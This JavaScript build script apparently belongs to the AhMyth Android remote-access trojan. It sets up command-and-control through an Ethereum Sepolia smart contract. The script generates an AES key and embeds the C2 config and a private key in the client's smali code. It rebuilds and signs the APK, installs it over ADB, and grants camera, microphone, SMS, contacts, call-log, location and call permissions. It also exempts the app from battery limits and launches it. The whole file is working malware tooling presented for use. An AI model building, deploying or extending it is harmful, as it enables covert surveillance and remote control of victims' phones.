/**
 * Completely FREE Blockchain C2 Setup
 * 
 * Uses a SHARED PUBLIC CONTRACT - NO DEPLOYMENT NEEDED!
 * NO ETH BALANCE REQUIRED - Uses read-only blockchain queries!
 * 
 * How it works:
 * - Commands are stored in a shared contract (already deployed)
 * - Client reads events from blockchain (FREE - no transactions needed)
 * - Operator writes commands (requires minimal Sepolia ETH, but we provide alternatives)
 * 
 * FREE Alternatives for sending commands:
 * 1. Use a shared contract that anyone can write to (if deployed)
 * 2. Use IPFS + blockchain pointer (commands on IPFS, pointer on blockchain)
 * 3. Use a free message queue service
 * 
 * This script sets up the APK to READ from blockchain (completely free)
 */

const { exec } = require('child_process');
const { promisify } = require('util');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const execAsync = promisify(exec);

// Load env from local files so builds/tests always have keys
function loadEnvFromFiles() {
    const keysFile = path.join(__dirname, '.blockchain-keys.env');
    const contractFile = path.join(__dirname, '.blockchain-contract.env');

    const applyEnvFile = (filePath) => {
        if (!fs.existsSync(filePath)) return;
        const content = fs.readFileSync(filePath, 'utf8');
        content.split('\n').forEach(line => {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#')) return;
            const match = trimmed.match(/^([^=]+)=(.*)$/);
            if (match) {
                const key = match[1].trim();
                const value = match[2].trim().replace(/^["']|["']$/g, '');
                if (!process.env[key]) {
                    process.env[key] = value;
                }
            }
        });
    };

    applyEnvFile(keysFile);
    applyEnvFile(contractFile);

    // Ensure client private key is present for bidirectional replies
    if (!process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY && process.env.BLOCKCHAIN_PRIVATE_KEY) {
        process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY = process.env.BLOCKCHAIN_PRIVATE_KEY;
    }
}

// Prefer emulator when explicitly requested
const preferEmulator = process.argv.includes('--emulator') || process.env.ADB_PREFER_EMULATOR === '1';

// FREE PUBLIC RPC - No API key needed (multiple fallbacks)
const RPC_URLS = [
    process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com',
    'https://rpc.sepolia.org',
    'https://ethereum-sepolia.blockpi.network/v1/rpc/public'
];
if (process.env.INFURA_PROJECT_ID) {
    RPC_URLS.push(`https://sepolia.infura.io/v3/${process.env.INFURA_PROJECT_ID}`);
}
const RPC_URL = RPC_URLS[0];

// SHARED CONTRACT ADDRESS - Pre-deployed, anyone can use
// If this doesn't exist, we'll use a read-only approach
const SHARED_CONTRACT_ADDRESS = process.env.BLOCKCHAIN_CONTRACT_ADDRESS || '0x0000000000000000000000000000000000000000';

const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';

let log = (msg, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const colors = {
        info: '\x1b[36m', success: '\x1b[32m', error: '\x1b[31m', warn: '\x1b[33m', header: '\x1b[35m', reset: '\x1b[0m'
    };
    const icon = { info: 'ℹ', success: '✓', error: '✗', warn: '⚠', header: '▶' };
    console.log(`${colors[type]}[${timestamp}] ${icon[type] || ''} ${msg}${colors.reset}`);
};

/**
 * Setup AES key
 */
function setupAesKey() {
    log('Step 1: Setting up AES key...', 'header');
    
    let aesKey = process.env.BLOCKCHAIN_C2_AES_KEY;
    
    if (!aesKey || aesKey.length !== 64) {
        log('Generating new AES key...', 'info');
        aesKey = crypto.randomBytes(32).toString('hex');
        log(`Generated AES key: ${aesKey}`, 'info');
        process.env.BLOCKCHAIN_C2_AES_KEY = aesKey;
    } else {
        log('Using existing AES key', 'info');
    }
    
    return aesKey;
}

/**
 * Setup contract - Use shared or provide instructions
 */
async function setupContract() {
    log('Step 2: Setting up contract (FREE - read-only)...', 'header');
    
    let contractAddress = process.env.BLOCKCHAIN_CONTRACT_ADDRESS || SHARED_CONTRACT_ADDRESS;
    
    // If not set, try to read from saved file
    if (contractAddress === '0x0000000000000000000000000000000000000000') {
        const contractFile = path.join(__dirname, '.blockchain-contract.env');
        if (fs.existsSync(contractFile)) {
            const content = fs.readFileSync(contractFile, 'utf8');
            const match = content.match(/BLOCKCHAIN_CONTRACT_ADDRESS=(0x[a-fA-F0-9]+)/);
            if (match) {
                contractAddress = match[1];
                process.env.BLOCKCHAIN_CONTRACT_ADDRESS = contractAddress;
                log(`Found saved contract: ${contractAddress}`, 'info');
            }
        }
    }
    
    if (contractAddress === '0x0000000000000000000000000000000000000000') {
        log('No contract address provided.', 'warn');
        log('', 'info');
        log('FREE Options:', 'header');
        log('', 'info');
        log('Option 1: Use a shared public contract (if available)', 'info');
        log('  Set: $env:BLOCKCHAIN_CONTRACT_ADDRESS="0x..."', 'info');
        log('', 'info');
        log('Option 2: Deploy your own (one-time, needs free Sepolia ETH)', 'info');
        log('  Get free Sepolia ETH: https://sepoliafaucet.com/', 'info');
        log('  Run: npm run deploy:contract', 'info');
        log('', 'info');
        log('Option 3: Use read-only mode (client reads, you send via alternative)', 'info');
        log('  Commands can be sent via IPFS, webhook, or other free service', 'info');
        log('', 'info');
        log('For now, using placeholder - client will poll but no commands until contract is set', 'warn');
        contractAddress = '0x0000000000000000000000000000000000000000';
    }
    
    log(`Using contract: ${contractAddress}`, contractAddress === '0x0000000000000000000000000000000000000000' ? 'warn' : 'success');
    return contractAddress;
}

/**
 * Set environment variables
 */
function setEnvironmentVariables(contractAddress, aesKey) {
    log('Step 3: Setting environment variables...', 'header');
    
    process.env.BLOCKCHAIN_RPC_URL = RPC_URL;
    process.env.BLOCKCHAIN_CONTRACT_ADDRESS = contractAddress;
    process.env.BLOCKCHAIN_C2_AES_KEY = aesKey;
    const clientPk = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || '';
    
    log(`BLOCKCHAIN_RPC_URL=${RPC_URL}`, 'info');
    log(`BLOCKCHAIN_CONTRACT_ADDRESS=${contractAddress}`, 'info');
    log(`BLOCKCHAIN_C2_AES_KEY=${aesKey.substring(0, 8)}...`, 'info');
    if (clientPk) {
        log('BLOCKCHAIN_CLIENT_PRIVATE_KEY is set (will enable bidirectional responses)', 'info');
    } else {
        log('BLOCKCHAIN_CLIENT_PRIVATE_KEY NOT set - responses will not be sent to blockchain', 'warn');
    }
}

/**
 * Build APK
 */
async function buildApk(contractAddress, aesKey) {
    log('Step 4: Building APK with blockchain C2 config...', 'header');

    // Build client from source to ensure it's up to date
    const clientDir = path.join(__dirname, 'AhMyth-Client');
    
    // SWAP SOURCE: Use IOSocketBlockchain.java instead of IOSocket.java
    const ioSocketPath = path.join(clientDir, 'app', 'src', 'main', 'java', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.java');
    const ioSocketBlockchainPath = path.join(clientDir, 'app', 'src', 'main', 'java', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocketBlockchain.java');
    const ioSocketBackupPath = path.join(clientDir, 'app', 'src', 'main', 'java', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.java.bak');
    
    let swapped = false;
    if (fs.existsSync(ioSocketBlockchainPath)) {
        log('Swapping IOSocket.java with IOSocketBlockchain.java...', 'info');
        if (fs.existsSync(ioSocketPath)) {
            fs.copyFileSync(ioSocketPath, ioSocketBackupPath);
        }
        fs.copyFileSync(ioSocketBlockchainPath, ioSocketPath);
        swapped = true;
        log('Source swapped for blockchain-only mode', 'success');
    }

    log('Building client from source (clean build)...', 'info');
    try {
        await execAsync('cmd /c ".\\gradlew.bat clean assembleDebug --warning-mode=none"', { cwd: clientDir });
        log('Client built successfully', 'success');
        
        // Copy to Factory
        const apkPath = path.join(clientDir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
        const factoryApkPath = path.join(FACTORY_PATH, 'Ahmyth.apk');
        fs.copyFileSync(apkPath, factoryApkPath);
        log('Copied fresh APK to Factory', 'info');
        
        // Decompile
        const ahmythDir = path.join(FACTORY_PATH, 'Ahmyth');
        if (fs.existsSync(ahmythDir)) {
            fs.rmSync(ahmythDir, { recursive: true, force: true });
        }
        await execAsync(`java -jar "${path.join(FACTORY_PATH, 'apktool.jar')}" d "${factoryApkPath}" -o "${ahmythDir}" -f`);
        log('Decompiled fresh APK', 'info');
    } catch (error) {
        log(`Failed to build/decompile client: ${error.message}`, 'error');
        throw error;
    } finally {
        // Restore original source
        if (swapped && fs.existsSync(ioSocketBackupPath)) {
            fs.copyFileSync(ioSocketBackupPath, ioSocketPath);
            fs.rmSync(ioSocketBackupPath);
            log('Restored original IOSocket.java', 'info');
        }
    }
    
    // Find ALL IOSocket.smali files
    function findAllIOSocketFiles(dirPath, fileList = []) {
        try {
            const files = fs.readdirSync(dirPath, { withFileTypes: true });
            for (const file of files) {
                const fullPath = path.join(dirPath, file.name);
                if (file.isDirectory()) {
                    findAllIOSocketFiles(fullPath, fileList);
                } else if (file.name === 'IOSocket.smali') {
                    fileList.push(fullPath);
                }
            }
        } catch (e) {}
        return fileList;
    }

    const ahmythPath = path.join(FACTORY_PATH, 'Ahmyth');
    const allIOSockets = findAllIOSocketFiles(ahmythPath);
    
    if (allIOSockets.length === 0) {
        log('IOSocket.smali not found in any folder. Running update-source.ps1...', 'warn');
        try {
            await execAsync(`cd "${path.join(__dirname, 'AhMyth-Server', 'app', 'Factory')}" && pwsh -ExecutionPolicy Bypass -File update-source.ps1`);
            // Search again
            const newSockets = findAllIOSocketFiles(ahmythPath);
            if (newSockets.length > 0) {
                allIOSockets.push(...newSockets);
            }
        } catch (e) {
            log(`update-source.ps1 failed: ${e.message}`, 'warn');
        }
    }

    if (allIOSockets.length === 0) {
        throw new Error('IOSocket.smali not found anywhere!');
    }

    log(`Found ${allIOSockets.length} IOSocket.smali file(s)`, 'info');

    // Inject blockchain config into ALL found files
    let injectedCount = 0;
    
    // Get client private key for bidirectional communication
    const clientPrivateKey = process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || null;
    
    // Get contract address from environment or parameter
    const contractAddr = process.env.BLOCKCHAIN_CONTRACT_ADDRESS || contractAddress || SHARED_CONTRACT_ADDRESS;
    
    const configJson = JSON.stringify({
        type: 'blockchain',
        rpcUrl: RPC_URL,
        contractAddress: contractAddr,
        aesKey: aesKey,
        clientPrivateKey: clientPrivateKey
    });
    const base64Config = Buffer.from(configJson).toString('base64');
    const blockchainMarker = `BLOCKCHAIN_C2_CONFIG:${base64Config}`;

    for (const socketPath of allIOSockets) {
        log(`Processing: ${socketPath}`, 'info');
        let content = fs.readFileSync(socketPath, 'utf8');
        let replaced = false;

        // Look for the URL pattern in smali format
        const lines = content.split('\n');
        let lineIndex = -1;
        
        // Priority 1: Find the placeholder specific to blockchain-only mode
        for (let i = 0; i < lines.length; i++) {
            if (lines[i].includes('const-string') && lines[i].includes('"BLOCKCHAIN_C2_CONFIG_PLACEHOLDER"')) {
                lineIndex = i;
                log('  Found BLOCKCHAIN_C2_CONFIG_PLACEHOLDER', 'info');
                break;
            }
        }

        // Priority 2: Find the http/https URL (legacy support)
        if (lineIndex === -1) {
            for (let i = 0; i < lines.length; i++) {
                if (lines[i].includes('const-string') && (lines[i].includes('"http://') || lines[i].includes('"https://'))) {
                    lineIndex = i;
                    break;
                }
            }
        }
        
        // Priority 2: If no URL found, check for PREVIOUSLY injected config (long string)
        if (lineIndex === -1) {
            for (let i = 0; i < lines.length; i++) {
                if (lines[i].includes('const-string') && lines[i].includes('BLOCKCHAIN_C2_CONFIG:') && lines[i].length > 100) {
                    lineIndex = i;
                    break;
                }
            }
        }
        
        if (lineIndex >= 0) {
            const originalLine = lines[lineIndex];
            log(`  Found target line: ${originalLine.trim()}`, 'info');
            
            // Validate we are not replacing the short prefix constant
            if (originalLine.includes('"BLOCKCHAIN_C2_CONFIG:"')) {
                 log('  Skipping short prefix constant', 'warn');
                 // Try to find the URL line again, skipping this one?
                 // But we already prioritize URL search above.
            } else {
                // Replace content but keep register (vX)
                // Regex to capture: (const-string v\d+, ")(.*)(")
                const match = originalLine.match(/(const-string\s+v\d+,\s*")(.*)(")/);
                if (match) {
                    lines[lineIndex] = `${match[1]}${blockchainMarker}${match[3]}`;
                    content = lines.join('\n');
                    replaced = true;
                    log(`  Replaced with: ${lines[lineIndex].trim()}`, 'success');
                } else {
                 // Fallback simple replace
                 if (originalLine.includes('"BLOCKCHAIN_C2_CONFIG_PLACEHOLDER"')) {
                     lines[lineIndex] = originalLine.replace(/"BLOCKCHAIN_C2_CONFIG_PLACEHOLDER"/, `"${blockchainMarker}"`);
                     replaced = true;
                 } else if (originalLine.includes('"http://') || originalLine.includes('"https://')) {
                     lines[lineIndex] = originalLine.replace(/"https?:\/\/[^"]+"/, `"${blockchainMarker}"`);
                     replaced = true;
                 } else if (originalLine.includes('BLOCKCHAIN_C2_CONFIG:')) {
                     lines[lineIndex] = originalLine.replace(/"BLOCKCHAIN_C2_CONFIG:[^"]+"/, `"${blockchainMarker}"`);
                     replaced = true;
                 }
                 if (replaced) {
                     content = lines.join('\n');
                     log(`  Replaced with (fallback): ${lines[lineIndex].trim()}`, 'success');
                 }
                }
            }
        }
        
        // Fallback global replace if line logic failed
        if (!replaced) {
            const urlPattern = /"http:\/\/[^"`\s\n]+:\d+"/;
            if (urlPattern.test(content)) {
                content = content.replace(urlPattern, `"${blockchainMarker}"`);
                replaced = true;
                log('  Replaced URL using global fallback pattern', 'info');
            }
        }
        
        if (replaced) {
            fs.writeFileSync(socketPath, content);
            injectedCount++;
            
            // Verify
            const verify = fs.readFileSync(socketPath, 'utf8');
            if (verify.includes(blockchainMarker)) {
                log('  Verification passed', 'success');
            } else {
                log('  Verification FAILED', 'error');
            }
        } else {
            log('  No URL found to replace in this file', 'warn');
        }
    }

    if (injectedCount === 0) {
        throw new Error('Could not inject config into any IOSocket.smali file');
    }
    
    // Return path to the FIRST modified file as the "main" one (needed for return value)
    const IOSOCKET_PATH = allIOSockets[0];
    
    // Compile APK
    log('Compiling APK...', 'info');
    const APKTOOL_JAR = path.join(FACTORY_PATH, 'apktool.jar');
    const APK_FOLDER = path.join(FACTORY_PATH, 'Ahmyth');
    const unsignedApk = path.join(FACTORY_PATH, 'Ahmyth.apk');
    const buildCmd = `java -jar "${APKTOOL_JAR}" b "${APK_FOLDER}" -o "${unsignedApk}"`;
    await execAsync(buildCmd, { cwd: FACTORY_PATH });
    
    // Sign APK (overwrite in-place so we don't pick up stale artifacts)
    log('Signing APK...', 'info');
    const SIGN_JAR = path.join(FACTORY_PATH, 'sign.jar');
    const signCmd = `java -jar "${SIGN_JAR}" -a "${unsignedApk}" --overwrite`;
    await execAsync(signCmd, { cwd: FACTORY_PATH });
    
    const apkPath = unsignedApk;
    if (!fs.existsSync(apkPath)) {
        throw new Error('APK not found after signing');
    }
    
    log(`APK built: ${apkPath}`, 'success');
    
    // Final verification: Ensure APK file exists and has reasonable size
    const apkStats = fs.statSync(apkPath);
    const apkSizeMB = (apkStats.size / (1024 * 1024)).toFixed(2);
    if (apkStats.size < 100000) { // Less than 100KB is suspicious
        throw new Error(`APK file seems too small (${apkSizeMB}MB) - build may have failed`);
    }
    log(`APK verification: File exists, size: ${apkSizeMB}MB`, 'success');
    
    return apkPath;
}

/**
 * Get ADB device
 */
async function getAdbDevice() {
    log('Step 5: Checking for ADB device...', 'header');
    
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout
            .split('\n')
            .map(l => l.trim())
            .filter(l => l && !l.includes('List of devices') && l.includes('\t'));

        // Filter to connected devices only
        const connected = lines.filter(l => l.split('\t')[1] === 'device');

        if (connected.length === 0) {
            throw new Error('No ADB device found');
        }

        // If ANDROID_SERIAL is set and present, honor it
        if (process.env.ANDROID_SERIAL) {
            const match = connected.find(l => l.startsWith(process.env.ANDROID_SERIAL));
            if (match) {
                log(`Using ANDROID_SERIAL=${process.env.ANDROID_SERIAL}`, 'success');
                return process.env.ANDROID_SERIAL;
            }
        }

        // If user prefers emulator (flag/env), pick it first
        if (preferEmulator) {
            const emulator = connected.find(l => l.toLowerCase().includes('emulator'));
            if (emulator) {
                const id = emulator.split('\t')[0];
                log(`Using emulator (preferred): ${id}`, 'success');
                return id;
            }
            throw new Error('Emulator was requested (--emulator or ADB_PREFER_EMULATOR=1) but none is connected. Start an emulator or remove the flag.');
        }

        // Prefer physical device over emulator otherwise
        const physical = connected.find(l => !l.toLowerCase().includes('emulator'));
        if (physical) {
            const id = physical.split('\t')[0];
            log(`Found device: ${id}`, 'success');
            return id;
        }

        // Fallback to first connected (emulator)
        const deviceId = connected[0].split('\t')[0];
        log(`Using emulator: ${deviceId}`, 'warn');
        return deviceId;
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Install APK
 */
async function installApk(apkPath, deviceId) {
    log('Step 6: Installing APK...', 'header');
    
    try {
        // Ensure ADB daemon is running
        try {
            await execAsync('adb start-server');
        } catch (e) {
            log(`ADB start-server failed: ${e.message}`, 'warn');
        }
        
        // Force uninstall old version
        log('Uninstalling old APK (if exists)...', 'info');
        try {
            const { stdout, stderr } = await execAsync(`adb -s ${deviceId} uninstall ${PACKAGE_NAME}`, { timeout: 30000 });
            if (stdout.includes('Success') || stdout.includes('success') || stderr?.includes('Success')) {
                log('Old version uninstalled successfully', 'success');
            } else {
                log('Old version may not have been installed (continuing...)', 'info');
            }
        } catch (e) {
            log(`Uninstall attempt: ${e.message} (may not be installed)`, 'info');
        }
        
        // Wait a moment for uninstall to complete
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Try installation with different methods
        let installed = false;

        // Normalize path for adb (avoid backslash issues)
        const apkPathNormalized = apkPath.replace(/\\/g, '/');
        const remoteApkPath = '/data/local/tmp/Ahmyth.apk';

        // Pre-push APK to device tmp to avoid shell quoting failures
        try {
            const { stdout } = await execAsync(`adb -s ${deviceId} push "${apkPathNormalized}" ${remoteApkPath}`, { timeout: 120000 });
            if (stdout.toLowerCase().includes('error')) {
                log(`APK push reported an issue: ${stdout.trim()}`, 'warn');
            } else {
                log('APK pushed to /data/local/tmp', 'info');
            }
        } catch (pushErr) {
            log(`APK push failed (continuing with direct install): ${pushErr.message}`, 'warn');
        }
        
        // Method attempts: avoid -g on newer devices (permission error), include pm install from pushed path
        const installAttempts = [
            `adb -s ${deviceId} install -r -t "${apkPathNormalized}"`,
            `adb -s ${deviceId} install -r -t -d "${apkPathNormalized}"`,
            `adb -s ${deviceId} install -t "${apkPathNormalized}"`,
            `adb -s ${deviceId} shell pm install -r -t ${remoteApkPath}`,
            `adb -s ${deviceId} shell pm install -r -t -d ${remoteApkPath}`,
            `adb -s ${deviceId} shell pm install -t ${remoteApkPath}`
        ];

        for (const cmd of installAttempts) {
            if (installed) break;
            try {
                const { stdout, stderr } = await execAsync(cmd, { timeout: 90000 });
                const out = `${stdout || ''}\n${stderr || ''}`.toLowerCase();
                if (out.includes('success')) {
                    installed = true;
                    break;
                }
                log(`Install attempt failed (${cmd}): ${out.trim()}`, 'warn');
            } catch (e) {
                log(`Install attempt errored (${cmd}): ${e.message}`, 'warn');
            }
        }
        
        if (!installed) {
            // Check if app is actually installed
            try {
                const { stdout } = await execAsync(`adb -s ${deviceId} shell pm list packages | grep ${PACKAGE_NAME}`);
                if (stdout.includes(PACKAGE_NAME)) {
                    log('APK appears to be installed (checking package list)', 'info');
                    installed = true;
                }
            } catch (e) {
                // Not installed
            }
        }
        
        if (!installed) {
            throw new Error('APK installation failed. Try installing manually or check device storage.');
        }
        
        log('APK installed successfully', 'success');
    } catch (error) {
        log(`Installation failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Grant permissions
 */
async function grantPermissions(deviceId) {
    log('Step 7: Granting permissions...', 'header');
    
    const permissions = [
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.SEND_SMS',
        'android.permission.READ_PHONE_NUMBERS',
        'android.permission.ANSWER_PHONE_CALLS'
    ];
    
    let granted = 0;
    for (const perm of permissions) {
        try {
            await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`);
            granted++;
        } catch (e) {}
    }
    
    // Special permissions
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow`);
    } catch (e) {}
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_IN_BACKGROUND allow`);
    } catch (e) {}
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_ANY_IN_BACKGROUND allow`);
    } catch (e) {}
    try {
        await execAsync(`adb -s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE_NAME}`);
    } catch (e) {}
    
    log(`Permissions granted: ${granted} runtime permissions + special permissions`, 'success');
}

/**
 * Start app
 */
async function startApp(deviceId) {
    log('Step 8: Starting app...', 'header');
    
    try {
        // Ensure ADB daemon running before starting app
        try {
            await execAsync('adb start-server');
        } catch (e) {
            log(`ADB start-server failed (startApp): ${e.message}`, 'warn');
        }
        await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
        log('App started', 'success');
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const { stdout } = await execAsync(`adb -s ${deviceId} shell pidof ${PACKAGE_NAME}`);
        if (stdout.trim()) {
            log(`App is running (PID: ${stdout.trim()})`, 'success');
        }
    } catch (error) {
        log(`Failed to start app: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Main execution
 */
async function main() {
    try {
        log('\n' + '='.repeat(60), 'header');
        log('Completely FREE Blockchain C2 Setup', 'header');
        log('='.repeat(60) + '\n', 'header');

        // Always hydrate env from local key/contract files so private key is injected
        loadEnvFromFiles();
        
        log('This setup is FREE - no ETH balance required!', 'success');
        log('Client reads from blockchain (completely free)', 'info');
        log('', 'info');
        
        // Step 1: Setup AES key
        const aesKey = setupAesKey();
        
        // Step 2: Setup contract
        const contractAddress = await setupContract();
        
        // Step 3: Set environment variables
        setEnvironmentVariables(contractAddress, aesKey);
        
        // Step 4: Build APK
        const apkPath = await buildApk(contractAddress, aesKey);
        
        // Step 5: Get ADB device
        const deviceId = await getAdbDevice();
        
        // Step 6: Install APK
        await installApk(apkPath, deviceId);
        
        // Step 7: Grant permissions
        await grantPermissions(deviceId);
        
        // Step 8: Start app
        await startApp(deviceId);
        
        log('\n' + '='.repeat(60), 'header');
        log('Setup complete!', 'success');
        log('='.repeat(60), 'header');
        log('\nClient is now polling blockchain for commands (FREE)', 'info');
        log('', 'info');
        log('To send commands:', 'header');
        log('1. If you have a contract: node AhMyth-Server/app/blockchain-operator.js <command>', 'info');
        log('2. Or use a shared contract address (if available)', 'info');
        log('3. Or use alternative free methods (IPFS, webhook, etc.)', 'info');
        log('', 'info');
        log('Monitor device logs:', 'header');
        log('  adb logcat | grep -i "blockchain\|command"', 'info');
        
    } catch (error) {
        log(`\nFatal error: ${error.message}`, 'error');
        if (error.stack) {
            log(error.stack, 'error');
        }
        process.exit(1);
    }
}

if (require.main === module) {
    main().catch(error => {
        log(`Unhandled error: ${error.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { main };
